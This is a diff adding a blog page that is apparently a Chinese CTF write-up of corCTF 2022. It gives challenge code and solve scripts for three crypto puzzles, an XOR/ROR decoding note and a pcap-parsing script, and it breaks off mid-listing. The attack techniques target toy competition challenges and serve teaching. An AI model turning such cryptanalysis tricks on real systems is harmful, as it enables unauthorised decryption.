@@ -1,0 +1,658 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.1/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
+
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"junyu33.me","root":"/","images":"/images","scheme":"Mist","version":"8.1.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}};
+  </script>
+<meta name="description" content="把各个方向的简单题给摸完了。 当然这样是不行的。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="corctf2022-wp">
+<meta property="og:url" content="https://junyu33.me/2022/08/11/corctf2022.html">
+<meta property="og:site_name" content="现充|junyu33">
+<meta property="og:description" content="把各个方向的简单题给摸完了。 当然这样是不行的。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-08-11T14:00:00.000Z">
+<meta property="article:modified_time" content="2022-08-11T14:55:15.850Z">
+<meta property="article:author" content="丨junyu33丨">
+<meta property="article:tag" content="crypto">
+<meta property="article:tag" content="reverse">
+<meta property="article:tag" content="misc">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://junyu33.me/2022/08/11/corctf2022.html">
+
+
+<script class="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+<title>corctf2022-wp | 现充|junyu33</title>
+  
+
+
+
+  <noscript>
+  <style>
+  body { margin-top: 2rem; }
+
+  .use-motion .menu-item,
+  .use-motion .sidebar,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header {
+    visibility: visible;
+  }
+
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
+  </style>
+</noscript>
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+<!-- hexo injector head_end end --></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">现充|junyu33</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-bounce.css" rel="stylesheet">
+</div>
+        
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <section class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#tadpole"><span class="nav-number">1.</span> <span class="nav-text">tadpole</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#luckyguess"><span class="nav-number">2.</span> <span class="nav-text">luckyguess</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exchanged"><span class="nav-number">3.</span> <span class="nav-text">exchanged</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Microsoft-%E2%9D%A4%EF%B8%8F-Linux"><span class="nav-number">4.</span> <span class="nav-text">Microsoft ❤️ Linux</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#whack-a-frog"><span class="nav-number">5.</span> <span class="nav-text">whack-a-frog</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jsonquiz"><span class="nav-number">6.</span> <span class="nav-text">jsonquiz</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babypwn"><span class="nav-number">7.</span> <span class="nav-text">babypwn</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cshell2%EF%BC%88%E8%B5%9B%E5%90%8E%E8%A1%A5%E7%9A%84%EF%BC%89"><span class="nav-number">8.</span> <span class="nav-text">cshell2（赛后补的）</span></a></li></ol></div>
+        </section>
+        <!--/noindex-->
+
+        <section class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="丨junyu33丨"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">丨junyu33丨</p>
+  <div class="site-description" itemprop="description">flag{CU73_D3V1L}</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">47</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/junyu33" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;junyu33" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:2021141530091@stu.scu.edu.cn" title="E-Mail → mailto:2021141530091@stu.scu.edu.cn" rel="noopener" target="_blank"><i class="fab fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="tencent://message/?uin=2658799217&Site=&menu=yes" title="QQ → tencent:&#x2F;&#x2F;message&#x2F;?uin&#x3D;2658799217&amp;Site&#x3D;&amp;menu&#x3D;yes" rel="noopener" target="_blank"><i class="fab fa-qq fa-fw"></i>QQ</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll site-overview-item animated">
+    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://denerate.ink/" title="https:&#x2F;&#x2F;denerate.ink&#x2F;" rel="noopener" target="_blank">DeNeRATe</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://land.master-hash.workers.dev/" title="https:&#x2F;&#x2F;land.master-hash.workers.dev&#x2F;" rel="noopener" target="_blank">hash</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://mivik.gitee.io/" title="https:&#x2F;&#x2F;mivik.gitee.io&#x2F;" rel="noopener" target="_blank">Mivik</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://sjfhsjfh.gitee.io/" title="https:&#x2F;&#x2F;sjfhsjfh.gitee.io&#x2F;" rel="noopener" target="_blank">sjfhsjfh</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.xecades.xyz/" title="https:&#x2F;&#x2F;blog.xecades.xyz&#x2F;" rel="noopener" target="_blank">Xecades</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://blog.bluesadi.cn/" title="http:&#x2F;&#x2F;blog.bluesadi.cn&#x2F;" rel="noopener" target="_blank">34r7hm4n</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://acheing.com/" title="https:&#x2F;&#x2F;acheing.com&#x2F;" rel="noopener" target="_blank">acheing</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://sh1k4ku.github.io/" title="https:&#x2F;&#x2F;sh1k4ku.github.io&#x2F;" rel="noopener" target="_blank">sh1kaku</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://herbidog.cc/" title="https:&#x2F;&#x2F;herbidog.cc&#x2F;" rel="noopener" target="_blank">Xfish</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://wuuuudle.com/" title="https:&#x2F;&#x2F;wuuuudle.com&#x2F;" rel="noopener" target="_blank">wudi</a>
+        </li>
+    </ul>
+  </div>
+
+        </section>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://junyu33.me/2022/08/11/corctf2022.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="丨junyu33丨">
+      <meta itemprop="description" content="flag{CU73_D3V1L}">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="现充|junyu33">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          corctf2022-wp
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2022-08-11 22:00:00 / 修改时间：22:55:15" itemprop="dateCreated datePublished" datetime="2022-08-11T22:00:00+08:00">2022-08-11</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>7.2k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>7 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>把各个方向的简单题给摸完了。</p>
+<p>当然这样是不行的。</p>
+<span id="more"></span>
+<h2 id="tadpole"><a href="#tadpole" class="headerlink" title="tadpole"></a>tadpole</h2><p>题面：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, isPrime</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> randbelow</span><br><span class="line"></span><br><span class="line">p = bytes_to_long(<span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>).read())</span><br><span class="line"><span class="keyword">assert</span> isPrime(p)</span><br><span class="line"></span><br><span class="line">a = randbelow(p)</span><br><span class="line">b = randbelow(p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> (a * s + b) % p</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;a = &quot;</span>, a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;b = &quot;</span>, b)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;f(31337) = &quot;</span>, f(<span class="number">31337</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;f(f(31337)) = &quot;</span>, f(f(<span class="number">31337</span>)))</span><br></pre></td></tr></table></figure>
+<p>下减上得：</p>
+<p>$a*(f-s) \equiv ff - f \pmod p$</p>
+<p>左右相减是p的倍数，分解质因数即可（其实就是质数）。</p>
+<h2 id="luckyguess"><a href="#luckyguess" class="headerlink" title="luckyguess"></a>luckyguess</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/bin/python</span></span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line"></span><br><span class="line">p = <span class="number">2</span>**<span class="number">521</span> - <span class="number">1</span></span><br><span class="line">a = getrandbits(<span class="number">521</span>)</span><br><span class="line">b = getrandbits(<span class="number">521</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;a =&quot;</span>, a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;b =&quot;</span>, b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    x = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;enter your starting point: &quot;</span>))</span><br><span class="line">    y = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;alright, what&#x27;s your guess? &quot;</span>))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;?&quot;</span>)</span><br><span class="line">    exit(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">r = getrandbits(<span class="number">20</span>)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(r):</span><br><span class="line">    x = (x * a + b) % p</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> x == y:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;wow, you are truly psychic! here, have a flag:&quot;</span>, <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>).read())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;sorry, you are not a true psychic... better luck next time&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>使用不动点，构造 $x$使$x \equiv x*a+b \pmod p$</p>
+<p>故$p-b \equiv x*(a-1) \pmod p$</p>
+<p>$ x \equiv (a-1)^{-1} * (p-b) \pmod p$，直接<code>gmpy2.invert</code>即可。</p>
+<h2 id="exchanged"><a href="#exchanged" class="headerlink" title="exchanged"></a>exchanged</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> randbelow</span><br><span class="line"></span><br><span class="line">p = <span class="number">142031099029600410074857132245225995042133907174773113428619183542435280521982827908693709967174895346639746117298434598064909317599742674575275028013832939859778024440938714958561951083471842387497181706195805000375824824688304388119038321175358608957437054475286727321806430701729130544065757189542110211847</span></span><br><span class="line">a = randbelow(p)</span><br><span class="line">b = randbelow(p)</span><br><span class="line">s = randbelow(p)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p =&quot;</span>, p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;a =&quot;</span>, a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;b =&quot;</span>, b)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;s =&quot;</span>, s)</span><br><span class="line"></span><br><span class="line">a_priv = randbelow(p)</span><br><span class="line">b_priv = randbelow(p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> (a * s + b) % p</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mult</span>(<span class="params">s, n</span>):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        s = f(s)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">A = mult(s, a_priv)</span><br><span class="line">B = mult(s, b_priv)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;A =&quot;</span>, A)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;B =&quot;</span>, B)</span><br><span class="line"></span><br><span class="line">shared = mult(A, b_priv)</span><br><span class="line"><span class="keyword">assert</span> mult(B, a_priv) == shared</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">key = sha256(long_to_bytes(shared)).digest()[:<span class="number">16</span>]</span><br><span class="line">iv = long_to_bytes(randint(<span class="number">0</span>, <span class="number">2</span>**<span class="number">128</span>))</span><br><span class="line">cipher = AES.new(key, AES.MODE_CBC, iv=iv)</span><br><span class="line"><span class="built_in">print</span>(iv.<span class="built_in">hex</span>() + cipher.encrypt(pad(flag, <span class="number">16</span>)).<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure>
+<p>（以下相等默认在模$p$的条件下）</p>
+<p>将<code>mult</code>展开得：</p>
+<script type="math/tex; mode=display">A = a^x s+\sum_{i=0}^{x-1}a^ib</script><script type="math/tex; mode=display">B = a^y s+\sum_{i=0}^{y-1}a^ib</script><p>推一下式子可得：</p>
+<script type="math/tex; mode=display">shared = a^yA+B-a^ys</script><p>将B错位相减得：</p>
+<script type="math/tex; mode=display">a^{y+1}s-a^y(b-s)-b=B(a-1)</script><script type="math/tex; mode=display">a^y = (Aa-A+b)(b+as-s)^{-1}</script><p>故可求得$shared$.</p>
+<p>注意aes CBC模式的key与iv都是大端序。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> randbelow</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = ...</span><br><span class="line">a = ...</span><br><span class="line">b = ...</span><br><span class="line">s = ...</span><br><span class="line">A = ...</span><br><span class="line">B = ...</span><br><span class="line">iv = <span class="number">0xe0364f9f55fc27fc46f3ab1dc9db48fa</span></span><br><span class="line">enc = <span class="number">0x482eae28750eaba12f4f76091b099b01fdb64212f66caa6f366934c3b9929bad37997b3f9d071ce3c74d3e36acb26d6efc9caa2508ed023828583a236400d64e</span></span><br><span class="line">iv = iv.to_bytes(<span class="number">16</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">enc = enc.to_bytes(<span class="number">64</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line">a_y = (B*(a-<span class="number">1</span>)+b) * invert((b+a*s-s), p) % p</span><br><span class="line">shared = (a_y*A+B+(p-a_y)*s) % p</span><br><span class="line"></span><br><span class="line">key = sha256(long_to_bytes(shared)).digest()[:<span class="number">16</span>]</span><br><span class="line">cipher = AES.new(key, AES.MODE_CBC, iv=iv)</span><br><span class="line">plain = cipher.decrypt(enc)</span><br><span class="line"><span class="built_in">print</span>(plain)</span><br></pre></td></tr></table></figure>
+<h2 id="Microsoft-❤️-Linux"><a href="#Microsoft-❤️-Linux" class="headerlink" title="Microsoft ❤️ Linux"></a>Microsoft ❤️ Linux</h2><p>前半部分直接ida加载32位elf格式，将指定范围的bytes <code>ror 13</code>即可。（其实就是<code>ror 5</code>）</p>
+<p>后半部分ida用二进制模式打开，选择16位，可以发现是dos指令，加密方式是<code>xor 13</code>，长度为18，然而加密范围好像有点问题。</p>
+<p>密文只可能存在于0x210~0x233之间，整个异或13之后发现后18位像flag，与前面拼接即可。</p>
+<h2 id="whack-a-frog"><a href="#whack-a-frog" class="headerlink" title="whack-a-frog"></a>whack-a-frog</h2><p>拿到一个pcap文件，查看发现有很多get请求。</p>
+<p>先提取这些get请求：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> whacking-the-froggers.pcap| grep -a <span class="string">&#x27;anticheat?x=&#x27;</span> &gt; <span class="keyword">in</span></span><br></pre></td></tr></table></figure>
+<p>其中都含有x坐标和y坐标。使用正则表达式提取：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">io = <span class="built_in">open</span>(<span class="string">&#x27;in&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">out = <span class="built_in">open</span>(<span class="string">&#x27;out&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">x = []</span><br><span class="line">y = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">   get = io.readline()</span><br><span class="line">   <span class="keyword">if</span> <span class="built_in">len</span>(re.findall(<span class="string">rb&#x27;x=\d+&#x27;</span>, get)) &gt; <span class="number">0</span>:</span><br><span class="line">      <span class="built_in">print</span>(<span class="built_in">int</span>(re.findall(<span class="string">rb&#x27;x=\d+&#x27;</span>, get)[<span class="number">0</span>][<span class="number">2</span>:]), </span><br><span class="line">            <span class="built_in">int</span>(re.findall(<span class="string">rb&#x27;y=\d+&#x27;</span>, get)[<span class="number">0</span>][<span class="number">2</span>:]), file=out)</span><br></pre></td></tr></table></figure>
+<p>然后用c语言转换成字符画，结果之前把x和y搞反了：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> mp[<span class="number">600</span>][<span class="number">600</span>];</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span 